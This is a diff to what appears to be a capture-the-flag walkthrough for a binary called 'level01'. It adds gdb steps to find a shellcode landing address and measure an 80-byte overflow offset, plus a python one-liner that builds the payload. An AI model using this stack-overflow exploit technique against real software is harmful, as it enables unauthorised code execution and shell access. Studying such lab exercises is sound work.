@@ -73,19 +73,36 @@ Username :  "dat_wil" + shellcode        -> shellcode lands at 0x804a040 + 7 = 0
 Password :  80 bytes of padding + 0x804a047 (little-endian) -> overwrites the return address
 ```
 
+### Step 1 — locate the shellcode landing address
+
+`a_user_name` is a global, so it has a fixed address (`No PIE`). Read it straight
+from gdb:
+
+```sh
+gdb ./level01
+(gdb) p &a_user_name             # $1 = (char (*)[256]) 0x804a040 <a_user_name>
+(gdb) info address a_user_name   # Symbol "a_user_name" is static storage at address 0x804a040.
+```
+
+The shellcode is prefixed by `"dat_wil"` (7 bytes) to pass `verify_user_name`,
+so the entry point to jump to is `0x804a040 + 7 = 0x804a047`.
+
+### Step 2 — measure the overflow offset
+
 The padding length is a runtime value (stack alignment makes it 80..95), so it
 is measured once with gdb using distinct 4-byte markers:
 
 ```sh
-python -c 'print "dat_wil\n" + "AAAABBBBCCCCDDDD...UUUUVVVV"' > /tmp/p
+python -c 'print "dat_wil\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"' > /tmp/p
 gdb ./level01
 (gdb) run < /tmp/p
 # Program received signal SIGSEGV
 (gdb) info registers eip        # eip = 0x55555555 ("UUUU") -> offset 80
 ```
 
-`UUUU` is the 21st letter group, so the saved return address sits at byte
-`21 * 4 - 4 = 80` of the password.
+The marker string is 22 distinct 4-byte groups (`AAAA` ... `VVVV`). The group
+that lands in `eip` tells the offset: `UUUU` is the 21st group, so the saved
+return address sits at byte `21 * 4 - 4 = 80` of the password.
 
 Final exploit (25-byte `execve("/bin/sh")` shellcode, no NUL / newline bytes):
 
